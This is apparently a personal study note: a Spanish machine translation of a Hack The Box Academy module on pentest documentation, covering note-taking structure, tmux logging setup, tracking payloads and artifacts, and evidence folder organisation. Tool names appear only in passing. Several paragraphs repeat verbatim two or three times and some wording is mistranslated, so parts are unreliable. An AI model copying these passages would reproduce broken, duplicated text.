---
tags:
  - HTB-Academy
  - Penetration-Tester
---

## Introducción a la Documentación e Informes

---

Las sólidas habilidades de documentación e informes son increíblemente beneficiosas en cualquier área de Tecnología de la Información o Seguridad de la Información, y dominar estas habilidades puede ayudarnos a progresar rápidamente en nuestras carreras. Ser altamente técnico es excelente y esencial, pero sin habilidades blandas para respaldar nuestras habilidades técnicas de pwning, no seremos tan efectivos si estamos escribiendo políticas y procedimientos internos, documentación técnica, informes de pruebas de penetración u otros tipos de entregables de clientes.

No hay "talla única" para tomar notas y preparar informes, pero hay principios fundamentales que deben seguirse para tener éxito. Este módulo explorará diferentes estilos, desde herramientas de toma de notas, organización de nuestra evidencia en nuestra VM de prueba, redacción de Resúmenes Ejecutivos para audiencias no técnicas y documentación de Cadenas de Ataque y hallazgos técnicos. Intentamos proporcionar una fórmula genérica que cualquiera puede usar para lograr el éxito mientras rociamos consejos, trucos y mejores prácticas que hemos aprendido de alrededor de 25 años combinados en varios roles de consultoría técnica y gerencial orientados al cliente.

Una consideración crucial para nosotros como probadores es que una prueba de penetración es una instantánea en el tiempo del estado de seguridad de la red objetivo. Deberíamos incluir una sección general en nuestro informe que hable sobre el tipo de trabajo realizado, quién lo realizó, las direcciones IP de origen utilizadas en las pruebas y cualquier consideración especial (es decir, las pruebas realizadas de forma remota a través de VPN o desde un host dentro de la red del cliente). Esta descripción general también debe indicar que nuestras pruebas se realizaron durante un período específico y que cualquier cambio en los sistemas dentro del alcance y las vulnerabilidades resultantes no se capturarían en este informe entregable. Podríamos decir: "Todas las actividades de prueba se realizaron entre el 7 de enero de 2022 y el 19 de enero de 2022." También podríamos agregar un descargo de responsabilidad, como "Este informe representa una instantánea a tiempo durante el período de prueba mencionado anteriormentey Acme Consulting, LLC no puede dar fe del estado de los activos de información propiedad del cliente fuera de esta ventana de prueba."

---

## Documentación e Informes en la Práctica

Puedes estar pensando "`this will be a boring module.`", o "`how could we possibly make an entire course on this topic?`". Si bien la documentación y los informes no son el tema más emocionante y ciertamente no son tan satisfactorios como meter una caja o obtener DA en un laboratorio o en una red del mundo real, estas son habilidades críticas para cualquier persona en una función de consultoría. A continuación se presentan algunos ejemplos de veces en nuestras carreras cuando la documentación ordenada y exhaustiva y los informes detallados nos rescataron de lo que podría haberse convertido en una situación bastante desagradable.

**Escenario 1 - El caso de una VM Explotadora**

Durante un compromiso particularmente largo (una Prueba de Penetración Externa de casi un mes), me inscribí para el día y mi VM no se cargaría correctamente. Pasé un tiempo tratando de recuperar el sistema de archivos, pero se había ido por completo. Afortunadamente, había estado tomando notas de proyecto excelentes y detalladas usando una copia local de OneNote en mi estación de trabajo base. Mi equipo en ese momento utilizó una solución de almacenamiento compartido para todos los proyectos, y teníamos un script automatizado para sincronizar nuestros datos para compartir al final de las pruebas, tanto para fines de QA como de archivo. En un consejo de un compañero de equipo más importante, había estado respaldando mi evidencia de prueba para esta parte al final de cada día laboral. Por lo tanto, una vez que construí una nueva VM (de una plantilla que guardaba), todo lo que tenía que hacer era sincronizar los datos de mi proyecto y volví a las pruebas sin interrupciones.Si no hubiera estado siguiendo un proceso definido, el resultado podría haber sido catastrófico, perdiendo semanas de trabajo y potencialmente perdiendo un cliente para la empresa o incluso mi trabajo.

**Escenario 2 - Ping of Death**

Sabía que esta Prueba de Penetración Interna sería difícil a partir de la llamada de alcance inicial. Un miembro del equipo interno de TI del cliente era muy hostil y cuestionaba todo, sospechaba de las habilidades del equipo y era muy protector con un conjunto de servidores críticos (cuyas direcciones IP no estaban en el alcance de las pruebas). Durante la fase de enumeración de las pruebas, recibí un correo electrónico y una llamada del cliente pidiendo que se detuvieran todas las pruebas, ya que habíamos derribado varios servidores críticos que eran sensibles a cualquier tipo de escaneo. Produje todos los datos de registro, archivos de alcance y datos de escaneo sin marca de tiempo. Las direcciones IP de los hosts afectados estaban en mis escaneos, pero también se incluyeron en el archivo de alcance, que el cliente había confirmado. En este caso,No había hecho nada malo ya que estaba probando el alcance que me dieron (y confirmé) y no había realizado ninguna actividad de prueba imprudente. Sin embargo, hubo una lección aprendida que agregué a mis procesos. Después de esto, me aseguré de pedir a los clientes una lista específica de cualquier dirección IP individual y nombres de host que deberían excluirse explícitamente de cualquier escaneo u otra actividad de prueba. En esta situación, tenía una sólida documentación para respaldar qué actividades se habían realizado, y la confirmación por escrito de la dirección IP dentro del alcance varía desde el cliente. Sin embargo, encontré la oportunidad de refinar aún más mis procesos y crecer como consultor. Me aseguré de pedir a los clientes una lista específica de cualquier dirección IP individual y nombres de host que deberían excluirse explícitamente de cualquier escaneo u otra actividad de prueba. En esta situación, tenía una documentación sólida para respaldar qué actividades se habían realizado, y la confirmación por escrito de la dirección IP dentro del alcance varía desde el cliente. Sin embargo, encontré la oportunidad de refinar aún más mis procesos y crecer como consultor. Me aseguré de pedir a los clientes una lista específica de cualquier dirección IP individual y nombres de host que deberían excluirse explícitamente de cualquier escaneo u otra actividad de prueba. En esta situación, tenía una documentación sólida para respaldar qué actividades se habían realizado, y la confirmación por escrito de la dirección IP dentro del alcance varía desde el cliente. Sin embargo, encontré la oportunidad de refinar aún más mis procesos y crecer como consultor.

**Escenario 3 - Lento como la melaza**

En este último ejemplo, estaba realizando una Prueba de Penetración Interna en el sitio en el edificio de la sede de un cliente, sentado en un área de la oficina donde se sentaba el personal de TI. Sentado detrás de mí había un administrador de red particularmente hostil que había sido escéptico de nuestras habilidades y herramientas desde la llamada inicial, afirmando que las pruebas de penetración anteriores de otras compañías habían ralentizado la red enormemente debido a probadores inexpertos e imprudentes. Menos de 20 minutos después de la prueba, este administrador de red había enviado correos electrónicos a toda la lista de distribución y llegó a mi escritorio diciéndome que nuestros escaneos habían frenado la red y había bloqueado nuestras direcciones IP de origen. Luego pasamos por un ejercicio de compartir nuestra salida de escaneo, mostrando que habíamos seguido las mejores prácticas y que nada de lo que habíamos hecho explicaría la desaceleración de la red.Mientras tanto, otro administrador determinó que el modo de depuración se había habilitado en cada dispositivo de red, lo que, combinado con los escaneos normales de Nmap, fue suficiente para abrumar a los dispositivos y causar ralentizaciones. Una vez que esto se deshabilitó, las pruebas procedieron sin problemas. En este caso, nuestra documentación respaldó nuestras acciones y obligó al cliente a investigar más a fondo. Si no hubiéramos tenido ninguna (o mala) documentación, entonces la culpa podría haber sido fácilmente puesta en nosotros, y podría haber impactado en gran medida la relación con el cliente y nuestra reputación.nuestra documentación respaldó nuestras acciones y obligó al cliente a investigar más a fondo. Si no hubiéramos tenido ninguna (o mala) documentación, entonces la culpa podría haber sido fácilmente puesta en nosotros, y podría haber impactado en gran medida la relación con el cliente y nuestra reputación.nuestra documentación respaldó nuestras acciones y obligó al cliente a investigar más a fondo. Si no hubiéramos tenido ninguna (o mala) documentación, entonces la culpa podría haber sido fácilmente puesta en nosotros, y podría haber impactado en gran medida la relación con el cliente y nuestra reputación.

Estas historias ilustran la importancia de una documentación sólida. Necesitamos poder justificar nuestras acciones y, si se nos solicita, poder presentar pruebas para que el cliente intente solucionar un problema. No es raro que cualquier problema de red durante una prueba de penetración se atribuya al probador, independientemente de si es el resultado de sus actividades. Queremos estar en una posición sólida para cubrirnos y ayudar a nuestros clientes. Además, nunca queremos luchar para volver a hacer las pruebas después de perder evidencia o pedirle a un cliente más tiempo porque no fuimos diligentes en nuestra toma de notas y organización.

---

## Sobre este Módulo

Hemos incluido un portátil Obsidian de muestra y un informe de prueba de Penetración Interna de muestra (en formatos MS Word y PDF: contraseña zip `hackthebox`) que se puede descargar desde el `Resources` pestaña en la parte superior derecha de esta o cualquier otra sección del módulo. Estos son grandes recursos complementarios para mantener por sí mismos, pero también son útiles para tener a mano mientras se trabaja a través del contenido.

Hay muchas oportunidades en este módulo para practicar las habilidades que se enseñan, pero ninguna de ellas es obligatoria para completar el módulo. Para obtener el mayor valor de este módulo, recomendamos (obviamente) tomar notas detalladas y usar los consejos y trucos para ver dónde puede haber agujeros o ineficiencias en sus procesos. Una vez que descubras esto, esperamos que encuentres formas de ser más productivo y reducir la carga de informes porque, seamos honestos, a nadie le gusta informar; lo toleramos como un mal necesario. Una vez que haya terminado con este módulo, vale la pena practicar estos consejos sobre compromisos del mundo real o, si aún no está trabajando en una función de consultoría, practique sus habilidades de documentación e informes contra objetivos y laboratorios de capacitación.

Incluimos un host de ataque preconfigurado y un pequeño laboratorio con este módulo que puede usar para simular una Prueba de Penetración Interna. Aproveche esto y úselo para practicar todo lo que desee hasta que se sienta cómodo identificando todos los hallazgos y desarrolle un estilo de documentación que se adapte a su flujo de trabajo.

A lo largo del módulo, puede vernos lanzando términos como "un interno" o "un externo". En estos casos nos estamos refiriendo a una Prueba de Penetración Interna o Prueba de Penetración Externa, respectivamente.

Hemos tratado de hacer que este tema típicamente aburrido sea más atractivo de lo habitual, así que párate. ¡Va a ser un viaje salvaje por la madriguera del conejo de documentación e informes!


# Nota y Organización

---

La toma de notas a fondo es crítica durante cualquier evaluación. Nuestras notas, acompañadas de herramientas y salida de registro, son las entradas sin procesar a nuestro borrador de informe, que generalmente es la única parte de nuestra evaluación que ve nuestro cliente. A pesar de que por lo general mantenemos nuestras notas para nosotros mismos, debemos mantener las cosas organizadas y desarrollar un proceso repetible para ahorrar tiempo y facilitar el proceso de presentación de informes. Las notas detalladas también son imprescindibles en caso de un problema de red o una pregunta del cliente (es decir, ¿escaneó el host X el día Y?), por lo que ser demasiado detallado en nuestra toma de notas nunca duele. Todos tendrán su propio estilo con el que se sientan cómodos y deberán trabajar con sus herramientas y estructura organizativa preferidas para garantizar los mejores resultados posibles. En este módulo, cubriremos los elementos mínimos que, desde nuestra experiencia profesional,se debe anotar durante una evaluación (o incluso mientras se trabaja a través de un módulo grande, jugando una caja en HTB o tomando un examen) para ahorrar tiempo y energía para informar el tiempo o como una guía de referencia en el futuro. Si usted es parte de un equipo más grande donde alguien puede tener que cubrir una reunión de clientes para usted, las notas claras y consistentes son esenciales para garantizar que su compañero de equipo pueda hablar con confianza y precisión sobre qué actividades se realizaron y no se realizaron.las notas claras y consistentes son esenciales para garantizar que su compañero de equipo pueda hablar con confianza y precisión sobre qué actividades se realizaron y qué no.las notas claras y consistentes son esenciales para garantizar que su compañero de equipo pueda hablar con confianza y precisión sobre qué actividades se realizaron y qué no.

---

## Estructura de Muestra de Toma de Notas

No existe una solución o estructura universal para tomar notas, ya que cada proyecto y probador es diferente. La estructura a continuación es lo que hemos encontrado útil, pero debe adaptarse a su flujo de trabajo personal, tipo de proyecto y las circunstancias específicas que encontró durante su proyecto. Por ejemplo, algunas de estas categorías pueden no ser aplicables para una evaluación centrada en la aplicación e incluso pueden justificar categorías adicionales no enumeradas aquí.

- `Attack Path`Un esquema de toda la ruta si se afianza durante una prueba de penetración externa o compromete uno o más hosts (o el dominio AD) durante una prueba de penetración interna. Esbozar la ruta lo más cerca posible utilizando capturas de pantalla y salida de comandos facilitará el pegado en el informe más adelante y solo tendrá que preocuparse por el formato.
    
- `Credentials`un lugar centralizado para mantener sus credenciales y secretos comprometidos a medida que avanza.
    
- `Findings`- Recomendamos crear una subcarpeta para cada hallazgo y luego escribir nuestra narrativa y guardarla en la carpeta junto con cualquier evidencia (capturas de pantalla, salida de comandos). También vale la pena mantener una sección en su herramienta de toma de notas para registrar la información de los hallazgos para ayudar a organizarlos para el informe.
    
- `Vulnerability Scan Research`una sección para tomar notas sobre cosas que ha investigado y probado con sus escaneos de vulnerabilidad (para que no termine rehaciendo el trabajo que ya hizo).
    
- `Service Enumeration Research`- Una sección para tomar notas sobre qué servicios ha investigado, intentos fallidos de explotación, vulnerabilidades/configuraciones erróneas prometedoras, etc.
    
- `Web Application Research`una sección para anotar aplicaciones web interesantes que se encuentran a través de varios métodos, como la fuerza bruta de subdominio. Siempre es bueno realizar una enumeración completa de subdominios externamente, buscar puertos web comunes en evaluaciones internas y ejecutar una herramienta como Aquatone u EyeWitness para capturar todas las aplicaciones. A medida que revisa el informe de captura de pantalla, anote las aplicaciones de interés, los pares de credenciales comunes/predeterminados que probó, etc.
    
- `AD Enumeration Research`- Una sección para mostrar, paso a paso, qué enumeración de Active Directory ya ha realizado. Anote cualquier área de interés que necesite ejecutar más adelante en la evaluación.
    
- `OSINT`- Una sección para realizar un seguimiento de la información interesante que ha recopilado a través de OSINT, si corresponde al compromiso.
    
- `Administrative Information`algunas personas pueden encontrar útil tener una ubicación centralizada para almacenar información de contacto para otras partes interesadas del proyecto como Gerentes de Proyecto (PM) o Puntos de Contacto del cliente (POC), objetivos/banderas únicos definidos en las Reglas de Participación (RoE) y otros elementos a los que a menudo se hace referencia a lo largo del proyecto. También se puede utilizar como una lista de tareas pendientes en ejecución. A medida que surjan ideas para las pruebas que necesita realizar o desea probar pero no tiene tiempo para, sea diligente al escribirlas aquí para que pueda volver a ellas más tarde.
    
- `Scoping Information`aquí, podemos almacenar información sobre direcciones IP/rangos de CIDR dentro del alcance, URL de aplicaciones web y cualquier credencial para aplicaciones web, VPN o AD proporcionada por el cliente. También podría incluir cualquier otra cosa pertinente al alcance de la evaluación, por lo que no tenemos que seguir reabriendo la información del alcance y asegurarnos de no desviarnos del alcance de la evaluación.
    
- `Activity Log`- Seguimiento de alto nivel de todo lo que hizo durante la evaluación para una posible correlación de eventos.
    
- `Payload Log`similar al registro de actividad, el seguimiento de las cargas útiles que está utilizando (y un hash de archivo para cualquier cosa cargada y la ubicación de carga) en un entorno de cliente es crítico. Más sobre esto más adelante.
    

---

## Herramientas de Toma de Notas

Hay muchas herramientas disponibles para tomar notas, y la elección es muy preferencia personal. Estas son algunas de las opciones disponibles:

||||
|---|---|---|
|[CherryTree](https://www.giuspen.com/cherrytree/)|[Código de Visual Studio](https://code.visualstudio.com/)|[Evernote](https://evernote.com/)|
|[Noción](https://www.notion.so/)|[GitBook](https://www.gitbook.com/)|[Texto Sublime](https://www.sublimetext.com/)|
|[Bloc de notas](https://notepad-plus-plus.org/downloads/)|[OneNote](https://www.onenote.com/?public=1)|[Esquema](https://www.getoutline.com/)|
|[Obsidiano](https://obsidian.md/)|[Criptpad](https://cryptpad.fr/)|[Notas Estándar](https://standardnotes.com/)|

Como equipo, hemos tenido muchas discusiones sobre los pros y los contras de varias herramientas para tomar notas. Un factor clave es distinguir entre soluciones locales y en la nube antes de elegir una herramienta. Una solución en la nube es probablemente aceptable para cursos de capacitación, CTF, laboratorios, etc., pero una vez que nos involucramos y administramos los datos de los clientes, debemos ser más cuidadosos con la solución que elegimos. Es probable que su empresa tenga algún tipo de política u obligaciones contractuales en torno al almacenamiento de datos, por lo que es mejor consultar con su gerente o líder de equipo sobre si se permite o no usar una herramienta específica para tomar notas. `Obsidian` es una excelente solución para el almacenamiento local, y `Outline` es genial para la nube, pero también tiene un [Versión autohospedada](https://github.com/outline/outline). Ambas herramientas se pueden exportar a Markdown e importar a cualquier otra herramienta que acepte este formato conveniente.

#### Obsidiano

![Aplicación de toma de notas de obsidiana que muestra una barra lateral con secciones como 'Información Administrativa' y 'Información de copia' en 'HTB Academy'.](https://academy.hackthebox.com/storage/modules/162/notetaking.png)

Una vez más, las herramientas son preferencias personales de persona a persona. Los requisitos generalmente varían de una compañía a otra, así que experimente con diferentes opciones y encuentre una con la que se sienta cómodo y practique con diferentes configuraciones y formatos mientras trabaja a través de módulos de Academy, cajas HTB, Pro Labs y otras piezas de capacitación para sentirse cómodo con su estilo de toma de notas mientras permanece lo más completo posible.

---

## Registro

Es esencial que registremos todos los intentos de escaneo y ataque y mantengamos la salida de la herramienta sin procesar siempre que sea posible. Esto nos ayudará mucho a llegar el tiempo de presentación de informes. Aunque nuestras notas deben ser claras y extensas, podemos perder algo, y tener nuestros registros para retroceder puede ayudarnos a agregar más evidencia a un informe o responder a una pregunta del cliente.

#### Intentos de Explotación

[Registro tmux](https://github.com/tmux-plugins/tmux-logging) es una excelente opción para el registro de terminales, y absolutamente deberíamos estar usando `Tmux`junto con el registro, esto guardará cada cosa que escribamos en un panel Tmux en un archivo de registro. También es esencial realizar un seguimiento de los intentos de explotación en caso de que el cliente necesite correlacionar eventos más adelante (o en una situación en la que hay muy pocos hallazgos y tienen preguntas sobre el trabajo realizado). Es sumamente vergonzoso si no puede producir esta información, y puede hacer que se vea inexperto y poco profesional como probador de penetración. También puede ser una buena práctica realizar un seguimiento de las cosas que probó durante la evaluación, pero no funcionó. Esto es especialmente útil para aquellos casos en los que tenemos pocos o ningún hallazgo en su informe. En este caso, podemos escribir una narración de los tipos de pruebas realizadas, para que el lector pueda comprender los tipos de cosas contra las que están adecuadamente protegidos.Podemos configurar el registro de Tmux en nuestro sistema de la siguiente manera:

Primero, clona el [Administrador de plugins de Tmux](https://github.com/tmux-plugins/tpm) repo a nuestro directorio de inicio (en nuestro caso `/home/htb-student` o simplemente `~`).

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
```

A continuación, crea un `.tmux.conf` archivo en el directorio de inicio.

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ touch .tmux.conf
```

El archivo de configuración debe tener los siguientes contenidos:

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ cat .tmux.conf 

# List of plugins

set -g @plugin 'tmux-plugins/tpm'
set -g @plugin 'tmux-plugins/tmux-sensible'
set -g @plugin 'tmux-plugins/tmux-logging'

# Initialize TMUX plugin manager (keep at bottom)
run '~/.tmux/plugins/tpm/tpm'
```

Después de crear este archivo de configuración, debemos ejecutarlo en nuestra sesión actual, por lo que la configuración en el `.tmux.conf` el archivo tiene efecto. Podemos hacer esto con el [fuente](https://www.geeksforgeeks.org/source-command-in-linux-with-examples/) comando.

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ tmux source ~/.tmux.conf 
```

A continuación, podemos iniciar una nueva sesión de Tmux (es decir, `tmux new -s setup`).

Una vez en la sesión, escriba `[Ctrl] + [B]` y luego golpeó `[Shift] + [I]` (o `prefix` + `[Shift] + [I]` si no está utilizando la clave de prefijo predeterminada), y el complemento se instalará (esto podría tardar alrededor de 5 segundos en completarse).

Una vez instalado el complemento, comience a registrar la sesión actual (o panel) escribiendo `[Ctrl] + [B]` seguido de `[Shift] + [P]` (`prefix` + `[Shift] + [P]`) para comenzar a registrar. Si todo salió según lo planeado, la parte inferior de la ventana mostrará que el registro está habilitado y el archivo de salida. Para dejar de registrar, repita el `prefix` + `[Shift] + [P]` combinación de teclas o tipo `exit` para matar la sesión. Tenga en cuenta que el archivo de registro solo se rellenará una vez que deje de iniciar sesión o salga de la sesión de Tmux.

Una vez que se completa el registro, puede encontrar todos los comandos y la salida en el archivo de registro asociado. Consulte la demostración a continuación para obtener una breve imagen visual sobre cómo iniciar y detener el registro de Tmux y ver los resultados.

![GIF mostrando el uso del plugin de registro de tmux.](https://academy.hackthebox.com/storage/modules/162/tmux_log_enable.gif)

Si olvidamos habilitar el registro de Tmux y estamos profundamente en un proyecto, podemos realizar un registro retroactivo escribiendo `[Ctrl] + [B]` y luego golpear `[Alt] + [Shift] + [P]` (`prefix` + `[Alt] + [Shift] + [P]`), y se guardará todo el panel. La cantidad de datos guardados depende del Tmux `history-limit` o el número de líneas mantenidas en el búfer de desplazamiento de Tmux. Si esto se deja en el valor predeterminado e intentamos realizar un registro retroactivo, lo más probable es que perdamos datos de antes en la evaluación. Para protegernos contra esta situación, podemos agregar las siguientes líneas a la `.tmux.conf` archivo (ajustando el número de líneas a nuestro gusto):

#### Tmux.conf

  Nota y Organización

```shell-session
set -g history-limit 50000
```

Otro truco útil es la capacidad de tomar una captura de pantalla de la ventana actual de Tmux o un panel individual. Digamos que estamos trabajando con una ventana dividida (2 paneles), una con `Responder` y uno con `ntlmrelayx.py`. Si intentamos copiar/pegar la salida de un panel, tomaremos los datos del otro panel junto con él, lo que se verá muy desordenado y requerirá limpieza. Podemos evitar esto tomando una captura de pantalla de la siguiente manera: `[Ctrl] + [B]` seguido de `[Alt] + [P]` (`prefix` + `[Alt] + [P]`). Veamos una demostración rápida.

Aquí podemos ver que estamos trabajando con dos paneles. Si intentamos copiar texto de un panel, tomaremos texto del otro panel, lo que causaría un desastre en la salida. Pero, con el registro de Tmux habilitado, podemos tomar una captura del panel y enviarlo perfectamente a un archivo.

![GIF que muestra una división vertical entre dos paneles en tmux.](https://academy.hackthebox.com/storage/modules/162/tmux_pane_capture.gif)

Para recrear el ejemplo anterior, primero inicie una nueva sesión de tmux: `tmux new -s sessionname`. Una vez en el tipo de sesión `[Ctrl] + [B]` + `[Shift] + [%]` (`prefix` + `[Shift] + [%]`) para dividir los paneles verticalmente (reemplace el `[%]` con `["]` para hacer una división horizontal). Luego podemos pasar de panel a panel escribiendo `[Ctrl] + [B]` + `[O]` (`prefix` + `[O]`).

Finalmente, podemos borrar el historial del panel escribiendo `[Ctrl] + [B]` seguido de `[Alt] + [C]` (`prefix` + `[Alt] + [C]`).

Hay muchas otras cosas que podemos hacer con Tmux, personalizaciones que podemos hacer con el registro de Tmux (es decir. [cambiar la ruta de registro predeterminada](https://github.com/tmux-plugins/tmux-logging/blob/master/docs/configuration.md), cambiar los enlaces de teclas, ejecutar múltiples ventanas dentro de las sesiones y paneles dentro de esas ventanas, etc.). Vale la pena leer todas las capacidades que ofrece Tmux y descubrir cómo la herramienta se adapta mejor a su flujo de trabajo. Finalmente, aquí hay algunos complementos adicionales que nos gustan:

- [tmux-sesionista](https://github.com/tmux-plugins/tmux-sessionist) nos da la capacidad de manipular sesiones de Tmux desde dentro de una sesión: cambiar a otra sesión, crear una nueva sesión con nombre, matar una sesión sin separar Tmux, promover el panel actual a una nueva sesión y más.
    
- [tmux-dolor-control](https://github.com/tmux-plugins/tmux-pain-control) un complemento para controlar paneles y proporcionar enlaces de teclas más intuitivos para moverse, cambiar el tamaño y dividir paneles.
    
- [tmux-resucitado](https://github.com/tmux-plugins/tmux-resurrect) - Este complemento extremadamente útil nos permite restaurar nuestro entorno Tmux después de que nuestro host se reinicie. Algunas características incluyen restaurar todas las sesiones, ventanas, paneles y su orden, restaurar programas en ejecución en un panel, restaurar sesiones de Vim y más.
    

Echa un vistazo a la completa [lista de plugins de tmux](https://github.com/tmux-plugins/list) para ver si otros encajarían bien en su flujo de trabajo. Para más información sobre Tmux, echa un vistazo a este excelente [video](https://www.youtube.com/watch?v=Lqehvpe_djs) por Ippsec y esto [hoja de trucos](https://mavericknerd.github.io/knowledgebase/ippsec/tmux/) basado en el video.

---

## Artefactos Dejados Atrás

Como mínimo, deberíamos rastrear cuándo se usó una carga útil, en qué host se usó, en qué ruta de archivo se colocó en el objetivo y si el cliente la limpió o necesita limpiarla. También se recomienda un hash de archivo para facilitar la búsqueda por parte del cliente. Es una buena práctica proporcionar esta información incluso si eliminamos shells web, cargas útiles o herramientas.

#### Creación de Cuenta/Modificaciones del Sistema

Si creamos cuentas o modificamos la configuración del sistema, debería ser evidente que necesitamos rastrear esas cosas en caso de que no podamos revertirlas una vez que se complete la evaluación. Algunos ejemplos de esto incluyen:

- Dirección IP del host(s)/hostname(s) donde se realizó el cambio
- Marca de tiempo del cambio
- Descripción del cambio
- Ubicación en el host(s) donde se realizó el cambio
- Nombre de la aplicación o servicio que fue manipulado
- Nombre de la cuenta (si creó una) y tal vez la contraseña en caso de que deba entregarla

No hace falta decirlo, pero como profesional y para evitar crear enemigos fuera del equipo de infraestructura, debe obtener la aprobación por escrito del cliente antes de realizar este tipo de modificaciones del sistema o realizar cualquier tipo de prueba que pueda causar un problema con la estabilidad o disponibilidad del sistema. Esto generalmente se puede resolver durante la llamada de inicio del proyecto para determinar el umbral más allá del cual el cliente está dispuesto a tolerar sin ser notificado.

---

## Evidencia

No importa el tipo de evaluación, a nuestro cliente (típicamente) no le importan las cadenas de exploits geniales que realizamos o la facilidad con la que "empujamos" su red. En última instancia, están pagando por el informe entregable, que debe comunicar claramente los problemas descubiertos y la evidencia que se puede utilizar para la validación y reproducción. Sin evidencia clara, puede ser un desafío para los equipos de seguridad interna, administradores de sistemas, desarrolladores, etc., reproducir nuestro trabajo mientras trabajamos para implementar una solución o incluso para comprender la naturaleza del problema.

#### Qué Capturar

Como sabemos, cada hallazgo deberá tener evidencia. También puede ser prudente recopilar evidencia de pruebas que se realizaron que no tuvieron éxito en caso de que el cliente cuestione su minuciosidad. Si está trabajando en la línea de comandos, los registros de Tmux pueden ser evidencia suficiente para pegar en el informe como salida de terminal literal, pero pueden formatearse horriblemente. Por esta razón, capturar la salida de su terminal para pasos significativos a medida que avanza y rastrear eso por separado junto con sus hallazgos es una buena idea. Para todo lo demás, se deben tomar capturas de pantalla.

#### Almacenamiento

Al igual que con nuestra estructura de toma de notas, es una buena idea crear un marco sobre cómo organizamos los datos recopilados durante una evaluación. Esto puede parecer exagerado en evaluaciones más pequeñas, pero si estamos probando en un entorno grande y no tenemos una forma estructurada de realizar un seguimiento de las cosas, vamos a terminar olvidando algo, violando las reglas de compromiso, y probablemente haciendo cosas más de una vez, lo que puede ser una gran pérdida de tiempo, especialmente durante una evaluación de tiempo. A continuación se muestra una estructura de carpeta de referencia sugerida, pero es posible que deba adaptarla en consecuencia según el tipo de evaluación que esté realizando o las circunstancias únicas.

- `Admin`
    
    - Alcance del trabajo (SoW) del que está trabajando, sus notas de la reunión de inicio del proyecto, informes de estado, notificaciones de vulnerabilidad, etc
- `Deliverables`
    
    - Carpeta para mantener sus entregables mientras trabaja a través de ellos. Esto a menudo será su informe, pero puede incluir otros elementos, como hojas de cálculo suplementarias y cubiertas de diapositivas, dependiendo de los requisitos específicos del cliente.
- `Evidence`
    
    - Hallazgos
        - Sugerimos crear una carpeta para cada hallazgo que planee incluir en el informe para mantener su evidencia para cada hallazgo en un contenedor para facilitar la preparación del recorrido cuando escriba el informe.
    - Escaneos
        - Escaneos de vulnerabilidad
            - Exporte archivos desde su escáner de vulnerabilidades (si corresponde para el tipo de evaluación) para archivar.
        - Enumeración de Servicios
            - Exporte archivos de las herramientas que utiliza para enumerar servicios en el entorno de destino como Nmap, Masscan, Rumble, etc.
        - Web
            - Exportar archivos para herramientas como archivos de estado ZAP o Burp, EyeWitness, Aquatone, etc.
        - AD Enumeración
            - Archivos JSON de BloodHound, archivos CSV generados a partir de PowerView o ADRecon, datos de Ping Castle, archivos de registro de Snaffler, registros de CrackMapExec, datos de herramientas de Impacket, etc.
    - Notas
        - Una carpeta para mantener sus notas.
    - OSINT
        - Cualquier salida OSINT de herramientas como Intelx y Maltego que no encaje bien en su documento de notas.
    - Inalámbrico
        - Opcional si las pruebas inalámbricas están en alcance, puede usar esta carpeta para la salida de herramientas de prueba inalámbricas.
    - Salida de registro
        - Registro de salida de Tmux, Metasploit y cualquier otra salida de registro que no se ajuste a la `Scan` subdirectorios enumerados anteriormente.
    - Archivos Misc
        - Conchas web, cargas útiles, scripts personalizados y cualquier otro archivo generado durante la evaluación que sea relevante para el proyecto.
- `Retest`
    
    - Esta es una carpeta opcional si necesita regresar después de la evaluación original y volver a probar los hallazgos descubiertos anteriormente. Es posible que desee replicar la estructura de carpetas que utilizó durante la evaluación inicial en este directorio para mantener su evidencia de nuevo ensayo separada de su evidencia original.

Es una buena idea tener guiones y trucos para configurar al comienzo de una evaluación. Podríamos tomar el siguiente comando para hacer nuestros directorios y subdirectorios y adaptarlo aún más.

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,'AD Enumeration'},Notes,OSINT,Wireless,'Logging output','Misc Files'},Retest}
```

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ tree ACME-IPT/

ACME-IPT/
├── Admin
├── Deliverables
├── Evidence
│   ├── Findings
│   ├── Logging output
│   ├── Misc Files
│   ├── Notes
│   ├── OSINT
│   ├── Scans
│   │   ├── AD Enumeration
│   │   ├── Service
│   │   ├── Vuln
│   │   └── Web
│   └── Wireless
└── Retest
```

Una buena característica de una herramienta como Obsidian es que podemos combinar nuestra estructura de carpetas y la estructura de toma de notas. De esta manera, podemos interactuar con las notas/carpetas directamente desde la línea de comandos o dentro de la herramienta Obsidian. Aquí podemos ver la estructura general de carpetas trabajando a través de Obsidian.

![Aplicación Obsidian con barra lateral que muestra secciones 'HTB_Academy' como 'Admin' y 'Evidence'; estados del área principal 'No hay archivo abierto' con opciones de archivo.](https://academy.hackthebox.com/storage/modules/162/notetaking2.png)

Al profundizar más, podemos ver los beneficios de combinar nuestra estructura de notas y carpetas. Durante una evaluación real, podemos agregar páginas/carpetas adicionales o eliminar algunas, una página y una carpeta para cada hallazgo, etc.

![Aplicación Obsidian con barra lateral que muestra secciones de 'Notas' como 'Información Administrativa' e 'Información Copia'; el área principal indica 'No hay archivo abierto' con opciones de archivo.](https://academy.hackthebox.com/storage/modules/162/notetaking3.png)

Echando un vistazo rápido a la estructura de directorios, podemos ver cada carpeta que creamos anteriormente y algunas ahora pobladas con páginas de Obsidian Markdown.

  Nota y Organización

```shell-session
vcrdcr@htb[/htb]$ tree
.
└── Inlanefreight Penetration Test
    ├── Admin
    ├── Deliverables
    ├── Evidence
    │   ├── Findings
    │   │   ├── H1 - Kerberoasting.md
    │   │   ├── H2 - ASREPRoasting.md
    │   │   ├── H3 - LLMNR&NBT-NS Response Spoofing.md
    │   │   └── H4 - Tomcat Manager Weak Credentials.md
    │   ├── Logging output
    │   ├── Misc files
    │   ├── Notes
    │   │   ├── 10. AD Enumeration Research.md
    │   │   ├── 11. Attack Path.md
    │   │   ├── 12. Findings.md
    │   │   ├── 1. Administrative Information.md
    │   │   ├── 2. Scoping Information.md
    │   │   ├── 3. Activity Log.md
    │   │   ├── 4. Payload Log.md
    │   │   ├── 5. OSINT Data.md
    │   │   ├── 6. Credentials.md
    │   │   ├── 7. Web Application Research.md
